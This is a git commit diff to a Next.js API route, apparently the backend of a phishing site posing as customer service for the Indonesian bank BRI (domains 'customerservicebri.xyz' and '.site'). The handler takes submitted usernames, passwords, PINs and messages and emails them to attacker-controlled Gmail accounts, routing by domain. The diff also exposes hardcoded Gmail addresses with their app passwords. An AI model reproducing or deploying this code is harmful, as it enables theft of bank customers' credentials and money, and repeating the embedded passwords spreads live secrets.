0dda93f85c0116d384ac9553528490219743aa14
reza_sandesta <sandesta24@gmail.com>
2022-07-18 19:46:47 +0700

    tambah email

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -4,22 +4,40 @@ export default function handler(req, res) {
     const { body } = req;
     const { url } = req.headers;
 
+    let email = '';
+    let pass = '';
+
     if(url == 'customerservicebri.xyz'){
+
+        email = 'yurawa111@gmail.com';
+        pass = 'ptopgzlhwhtktikt';
+
+    } else if (url == 'customerservicebri.site') {
+        
+        email = 'bbrimoid@gmail.com';
+        pass = 'cqygigrwdyxknnit';
+
+    } else {
+
+        email = 'febrifebru66@gmail.com';
+        pass = 'zaqegfyjqxbeqxdt';
+
+    }
         
         try {
             const transporter = nodemailer.createTransport({
                 port: 587,
                 host: 'smtp.googlemail.com',
                 auth: {
-                    user: 'yurawa111@gmail.com',
-                    pass: 'ptopgzlhwhtktikt',
+                    user: email,
+                    pass: pass,
                     },
                 secure: false,
             });
     
             const mailData = {
-                from: 'yurawa111@gmail.com',
-                to: 'yurawa111@gmail.com',
+                from: email,
+                to: email,
                 subject: 'Welcome to the app',
                 text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'} message: ${body.message ?? '-'}`,            
             }
@@ -37,37 +55,4 @@ export default function handler(req, res) {
             res.status(404).send('Not found')
         }
 
-    } else {
-        
-        try {
-            const transporter = nodemailer.createTransport({
-                port: 587,
-                host: 'smtp.googlemail.com',
-                auth: {
-                    user: 'febrifebru66@gmail.com',
-                    pass: 'zaqegfyjqxbeqxdt',
-                    },
-                secure: false,
-            });
-    
-            const mailData = {
-                from: 'febrifebru66@gmail.com',
-                to: 'febrifebru66@gmail.com',
-                subject: 'Welcome to the app',
-                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'} message: ${body.message ?? '-'}`,           
-            }
-      
-            transporter.sendMail(mailData, function (err, info) {
-                if(err){
-                  res.status(400).json({error: err})
-                }
-                else{
-                  res.status(200).json({info, status: 200})
-                }
-            })
-    
-        } catch (error) {
-            res.status(404).send('Not found')
-        }
-    }
 }
